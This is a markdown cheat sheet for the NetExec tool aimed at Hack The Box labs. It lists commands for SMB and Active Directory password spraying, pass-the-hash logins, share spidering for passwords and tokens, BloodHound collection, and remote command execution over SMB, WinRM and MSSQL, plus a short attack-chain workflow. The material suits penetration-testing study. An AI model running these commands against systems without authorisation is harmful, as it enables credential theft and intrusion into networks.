## NetExec (nxc) — Clean SMB/AD Cheat Sheet (HTB Focus)

> [!ABSTRACT] Core usage pattern  
> NetExec is an **Active Directory / SMB exploitation framework** used for:

- authentication testing
    
- enumeration
    
- remote execution
    
- credential discovery (spidering)
    

```bash
nxc <protocol> <target> -u <user> -p <pass> [options]
```

---

# > [!INFO] Authentication Modes

## Standard login

```bash
nxc smb 10.10.10.10 -u user -p pass
```

## Domain format login

```bash
nxc smb 10.10.10.10 -u 'DOMAIN\user' -p pass
```

## Null / guest auth

```bash
nxc smb 10.10.10.10 -u '' -p ''
nxc smb 10.10.10.10 -u guest -p ''
```

## Pass-the-Hash

```bash
nxc smb 10.10.10.10 -u Administrator -H <NTLM_HASH>
```

---

# > [!SUCCESS] Credential spraying / reuse

```bash
nxc smb 10.10.10.0/24 -u users.txt -p passwords.txt
```

## Avoid lockouts / continue

```bash
nxc smb 10.10.10.0/24 -u users.txt -p passwords.txt --continue-on-success
```

## Slow down requests

```bash
nxc smb 10.10.10.0/24 -u users.txt -p passwords.txt --jitter 3
```

---

# > [!INFO] SMB Enumeration

## Shares

```bash
nxc smb 10.10.10.10 -u user -p pass --shares
```

## Users

```bash
nxc smb 10.10.10.10 -u user -p pass --users
```

## Logged-on users

```bash
nxc smb 10.10.10.10 -u user -p pass --loggedon-users
```

---

# > [!SUCCESS] Remote Command Execution

## Basic execution

```bash
nxc smb 10.10.10.10 -u user -p pass -x "whoami"
```

## PowerShell execution

```bash
nxc smb 10.10.10.10 -u user -p pass -X '$PSVersionTable'
```

## Choose execution method

```bash
nxc smb 10.10.10.10 -u user -p pass --exec-method wmiexec
```

---

# > [!INFO] Spidering (CRITICAL for HTB creds)

## Basic spider

```bash
nxc smb 10.10.10.10 -u user -p pass --spider SHARE
```

## Spider + read file content

```bash
nxc smb 10.10.10.10 -u user -p pass --spider SHARE --content
```

## Spider + credential search (real-world use)

```bash
nxc smb 10.10.10.10 -u user -p pass \
--spider SHARE --content --pattern "passw"
```

## Better patterns (HTB gold)

```bash
--pattern "password|passwd|cred|user|login|key|token|secret"
```

---

# > [!INFO] LDAP (AD enumeration / BloodHound)

## Basic LDAP check

```bash
nxc ldap 10.10.10.10 -u user -p pass
```

## BloodHound collection

```bash
nxc ldap 10.10.10.10 -u user -p pass --bloodhound --collection All
```

---

# > [!INFO] MSSQL execution

```bash
nxc mssql 10.10.10.10 -u user -p pass -x "whoami"
```

---

# > [!INFO] RDP / WinRM / lateral movement

```bash
nxc winrm 10.10.10.10 -u user -p pass -x "whoami"
nxc rdp 10.10.10.10 -u user -p pass
```

---

# > [!CHECK] Local auth vs domain auth

```bash
nxc smb 10.10.10.10 -u user -p pass --local-auth
```

---

# > [!SUCCESS] Quick HTB workflow (real attack chain)

## 1. Check access

```bash
nxc smb 10.10.10.10 -u user -p pass --shares
```

## 2. Enumerate users

```bash
nxc smb 10.10.10.10 -u user -p pass --users
```

## 3. Spider for creds

```bash
nxc smb 10.10.10.10 -u user -p pass \
--spider SHARE --content --pattern "password"
```

## 4. Execute commands

```bash
nxc smb 10.10.10.10 -u user -p pass -x "whoami"
```

---

# > [!TLDR] NetExec mental model

- **SMB → enumerate + spider + execute**
    
- **LDAP → AD structure + BloodHound**
    
- **MSSQL → hidden command execution**
    
- **WinRM/RDP → lateral movement**
    
- **Spidering → credential harvesting**
    

---

If you want next upgrade, I can build you a:

> 🔥 “HTB AD Attack Decision Tree (when to use nxc vs impacket vs crackmapexec vs bloodhound)”